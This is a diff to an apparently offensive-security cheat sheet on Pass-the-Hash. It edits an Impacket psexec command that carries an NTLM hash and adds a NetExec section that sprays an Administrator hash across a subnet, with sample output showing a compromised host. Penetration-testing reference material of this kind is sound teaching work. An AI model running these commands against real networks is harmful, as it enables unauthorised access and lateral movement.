@@ -4001,7 +4001,7 @@ The result is a reverse shell connection from the DC01 host.
 We'll use Impacket's `psexec.py` to execute commands on the target system.
 
 ```bash
-impacket-psexec administrator@<IP> -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+impacket-psexec Administrator@<IP> -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 ```
 
 There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:
@@ -4009,6 +4009,36 @@ There are several other tools in the Impacket toolkit we can use for command exe
 * [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
 * [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
 * [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
+
+</details>
+
+<details>
+<summary><h3>Pass the Hash with NetExec (Linux)</h3></summary>
+
+NetExec is a powerful post-exploitation tool designed to automate security testing across large Active Directory environments. Its capabilities include:
+
+* **Credential Validation**: Tests authentication across network hosts to identify systems where provided credentials grant local admin access
+* **Password Spraying**: Attempts single login attempts across multiple hosts using provided credentials
+* **Lockout Avoidance**: Supports local account testing to minimize domain account lockout risks
+
+> **NOTE:** Always verify the target domain's account lockout policy before conducting password spraying tests.
+
+**Start netexec**
+
+```bash
+netexec smb 172.16.1.0/24 -u Administrator -d . -H <HASH>
+```
+
+**Expcted output**
+
+```bash
+# SMB         <DOMAIN_IP_1>   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
+# SMB         <DOMAIN_IP_1>   445    DC01             [-] .\Administrator:<HASH> STATUS_LOGON_FAILURE 
+# SMB         <DOMAIN_IP_2>   445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
+# SMB         <DOMAIN_IP_2>   445    MS01             [+] .\Administrator <HASH> (Pwn3d!)
+```
+
+
 
 </details>
 
